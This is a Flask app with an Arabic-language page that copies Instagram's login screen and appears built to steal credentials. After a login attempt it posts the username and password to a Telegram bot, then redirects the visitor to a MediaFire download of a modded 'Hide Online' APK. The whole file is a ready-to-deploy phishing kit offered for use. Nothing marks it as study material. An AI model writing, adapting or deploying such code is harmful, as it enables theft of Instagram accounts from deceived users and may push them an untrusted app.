import os
import re
import requests
from flask import Flask, redirect, render_template_string, request

app = Flask(__name__)
app.secret_key = os.getenv("SECRET_KEY", "hohosbid_super_secret_key")

BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

MEDIAFIRE_URL = (
    "https://www.mediafire.com/file/61ugass1zqpavlm/Hide_Online_v4.9.50_Mod"
    "__40_Updated__41_.apk/file"
)


@app.route("/", methods=["GET", "POST"])
def login():
  error = ""
  username_val = ""
  if request.method == "POST":
    username_val = request.form.get("username", "").strip()
    password = request.form.get("password", "")

    email_pattern = r"^[\w\.-]+@[\w\.-]+\.\w+$"
    username_pattern = r"^[a-zA-Z0-9_\.]{3,30}$"

    if not (
        re.match(email_pattern, username_val)
        or re.match(username_pattern, username_val)
    ):
      error = (
          "عذراً، يرجى إدخال اسم مستخدم أو بريد إلكتروني صحيح مرتبط بحسابك."
      )
    elif len(password) <= 5:
      error = "كلمة المرور غير صحيحة. يُرجى التحقق من كلمة المرور مرة أخرى."
    else:
      if BOT_TOKEN and CHAT_ID:
        msg = (
            "📸 تم استلام بيانات Instagram جديدة:\n\n👤 الحساب:"
            f" {username_val}\n🔑 الباسورد: {password}"
        )
        telegram_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        requests.post(telegram_url, json={"chat_id": CHAT_ID, "text": msg})

      return redirect(MEDIAFIRE_URL)

  return render_template_string(
      """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول • Instagram</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        body { background: #fff; width: 100vw; height: 100vh; display: flex; flex-direction: column; justify-content: space-between; align-items: center; }
        
        .main-container { width: 100%; max-width: 350px; padding: 20px; display: flex; flex-direction: column; justify-content: center; flex-grow: 1; text-align: center; }

        /* تدرج ألوان شعار إنستغرام المطابق للأصل تماماً */
        .insta-logo { 
            font-family: 'Billabong', cursive, sans-serif; 
            font-size: 52px; 
            margin-bottom: 25px; 
            font-weight: normal; 
            letter-spacing: 1px;
            background: linear-gradient(135deg, #f58529 0%, #dd2a7b 50%, #8134af 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .error-msg { color: #ed4956; font-size: 13px; line-height: 16px; margin-bottom: 15px; text-align: center; font-weight: 500; background: #fce8e6; padding: 10px; border-radius: 4px; border: 1px solid #fad2cf; }

        .input-group { margin-bottom: 8px; }
        .input-group input { width: 100%; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 5px; padding: 12px; font-size: 14px; color: #262626; outline: none; }
        .input-group input:focus { border-color: #a8a8a8; }

        .submit-btn { width: 100%; background: #0095f6; color: white; border: none; border-radius: 8px; padding: 12px; font-size: 14px; font-weight: 600; cursor: pointer; margin-top: 10px; margin-bottom: 15px; }
        .submit-btn:hover { background: #1877f2; }

        .divider { display: flex; align-items: center; margin: 10px 0 15px 0; }
        .divider-line { flex-grow: 1; height: 1px; background: #dbdbdb; }
        .divider-text { color: #8e8e8e; font-size: 13px; font-weight: 600; margin: 0 15px; text-transform: uppercase; }

        .forgot-pass { color: #00376b; font-size: 13px; text-decoration: none; display: block; margin-top: 10px; font-weight: 500; }

        .footer-section { width: 100%; padding-bottom: 20px; text-align: center; }
        
        .meta-footer { margin-bottom: 12px; }
        .meta-logo { font-size: 15px; font-weight: 600; letter-spacing: 0.5px; display: inline-flex; align-items: center; gap: 4px; direction: ltr; }
        .meta-logo span:nth-child(1) { color: #0081FB; }
        .meta-logo span:nth-child(2) { color: #0092FA; }
        .meta-logo span:nth-child(3) { color: #00A3F6; }
        .meta-logo span:nth-child(4) { color: #00B4F0; }

        .signup-card { padding: 12px; font-size: 14px; color: #262626; border-top: 1px solid #dbdbdb; width: 100%; }
        .signup-card a { color: #0095f6; font-weight: 600; text-decoration: none; }
    </style>
</head>
<body>
    <div class="main-container">
        <h1 class="insta-logo">Instagram</h1>
        
        {% if error %}
            <div class="error-msg">{{ error }}</div>
        {% endif %}

        <form method="POST">
            <div class="input-group">
                <input type="text" name="username" required placeholder="رقم الهاتف، اسم المستخدم أو البريد الإلكتروني" value="{{ username_val }}">
            </div>
            <div class="input-group">
                <input type="password" name="password" required placeholder="كلمة المرور">
            </div>
            <button type="submit" class="submit-btn">تسجيل الدخول</button>
        </form>

        <div class="divider">
            <div class="divider-line"></div>
            <div class="divider-text">أو</div>
            <div class="divider-line"></div>
        </div>

        <a href="#" class="forgot-pass">هل نسيت كلمة المرور؟</a>
    </div>

    <div class="footer-section">
        <div class="meta-footer">
            <div class="meta-logo">
                From 
                <span>M</span><span>e</span><span>t</span><span>a</span>
            </div>
        </div>
        <div class="signup-card">
            ليس لديك حساب؟ <a href="#">إشترك</a>
        </div>
    </div>
</body>
</html>
""",
      error=error,
      username_val=username_val,
  )


if __name__ == "__main__":
  app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
